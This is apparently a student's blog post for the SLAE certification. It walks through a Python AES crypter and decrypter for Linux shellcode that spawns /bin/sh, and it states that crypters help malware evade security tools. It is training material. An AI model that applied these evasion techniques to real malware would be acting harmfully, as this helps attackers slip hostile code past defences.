@@ -1,0 +1,116 @@
+---
+layout: single
+title: "SLAE: Custom SHellcode Crypter"
+excerpt: "created for completing the requirements of the SecurityTube Linux Assembly Expert certification"
+date: 2020-06-25
+header:
+  #image: /assets/images/SHELLCODING32.png
+  thumb: /assets/images/SHELLCODING32.png
+  teaser: /assets/images/SHELLCODING32.png
+  teaser_home_page: true
+classes: wide
+categories:
+  - SLAE
+  - infosec
+tags:
+  - shellcode
+  - assembly
+---
+
+
+#### This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert
+
+_*all supporting code can be found [here](https://github.com/RawrRadioMouse/SLAE_study/tree/master/Assignment_7)*_
+
+![slae32](/assets/images/SHELLCODING32.png)
+Student ID: SLAE - 1532
+
+Our 7th and final assignment for SLAE32 we will create a custom shellcode crypter.
+
+Crypters are used to encrypt malware for the purpose of security evasion. It allows malware to masquerade as harmless code until such time it is executed.
+
+The encryption method I have chosen is "Rijndael" (After the designers Vincent Rijmen and Joan Daemen) AKA Advanced Encryption Standard.
+
+Advanced cryptography is a bit beyond my current skill level, however I will attempt to provide a low-level explanation.
+
+AES is a form of symmetric encryption; symmetric meaning the same key used to encrypt is used to decrypt. To contrast this, RSA (typically used for remote connections) is asymmetric, using a public (server) and private (client) key. So in RSA, if you were to encrypt with the public key, the private key would be required to decrypt and vice versa. However with AES the same key that was used in encryption will need to be fed for decryption.
+
+AES256 encrypts in 14 rounds, with 1.1 x 10^77 possible combinations.
+Rather than encrypting a string, AES takes the bytes and lays them out in columns within a 4x4 grid.
+
+![grid](/assets/images/slae_7/1.JPG) source [computerphile](https://www.youtube.com/watch?v=O4xNJsjtN6E)
+
+It then works through a varying number of rounds where it will xor information against part of the key, substitute bytes and finally permute until we have an incredibly tough cypher.
+
+![AES_round](/assets/images/slae_7/2.JPG)
+
+Now that I have finished procrastinating, it is time to look at writing our own.
+Luckily for me, Python has modules that can aid this task.
+I read up on what is required at the following link: [https://www.novixys.com/blog/using-aes-encryption-decryption-python-pycrypto/](https://www.novixys.com/blog/using-aes-encryption-decryption-python-pycrypto/)
+
+
+```
+from Crypto.Cipher import AES
+import sys
+
+shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80") # must be divisible by 16
+
+key = ("SecurityTubeSLAE") # must be 16 bytes
+
+iv = ("l0lZ") * 4 # must be 16 bytes
+
+if len(key)!=16:
+	print("[!]key MUST be 16 bytes\n[!]Exiting")
+	sys.exit()
+if len(iv)!=16:
+	print("[!]iv MUST be 16 bytes\n[!]Exiting")
+	sys.exit()
+cipher = AES.new(key, AES.MODE_CBC, iv)
+
+
+if len(shellcode)%16 !=0:
+	print("[!]shellcode not divisible by 16, padding")
+	remainder = len(shellcode)%16 #figure out how many extra chars there are stopping it being divisible by 16
+	padnumber = 16 - remainder #figure out how many characters we need to make up the difference
+	shellcode = shellcode + ('1' * padnumber) #add exactly that many chars to the end of shellcode, thus making it divisible by 16
+
+print("Padded by "+str(padnumber))
+encrypt = cipher.encrypt(shellcode) # use cypher to encrypt ourshellcode against specified key and iv
+encoded = ""
+for x in bytearray(encrypt): #process code to give us shellcode as we have done in previous assignments
+	  encoded += '\\x'
+	  encrypt = '%02x' % x
+	  encoded += encrypt
+
+print("Encrypted shellcode: "+encoded)
+```
+Running our code as below gives us our encrypted string
+
+![encrypted](/assets/images/slae_7/3.JPG)
+
+Taking the encrypted string and placing it in our decoder before running it yields the exact same shellcode we originally placed in our encrypter script - thus, the string has been decrypted.
+
+```
+from Crypto.Cipher import AES
+ 
+shellcode = ("\xc9\xc9\x0f\xaf\xf8\x6c\x82\x69\xa6\x95\x25\x1e\xdd\x5e\xbc\x79\xd0\xec\xdb\xa5\x81\xa0\xfe\x55\x56\x6d\xe8\x7a\xed\x08\xc9\x99")
+
+key = ("SecurityTubeSLAE") # must be 16 bytes
+
+iv = ("l0lZ") * 4 # must be 16 bytes
+ 
+cipher = AES.new(key, AES.MODE_CBC, iv)
+padnumber=int("7") 
+decrypt = cipher.decrypt(shellcode)
+encoded = ""     
+
+for x in bytearray(decrypt):
+	  encoded += '\\x'
+	  dec = '%02x' % x#(x & 0xff)
+	  encoded += dec
+ 
+print encoded[0:-padnumber*4]
+```
+
+![decrypted](/assets/images/slae_7/4.JPG)
+
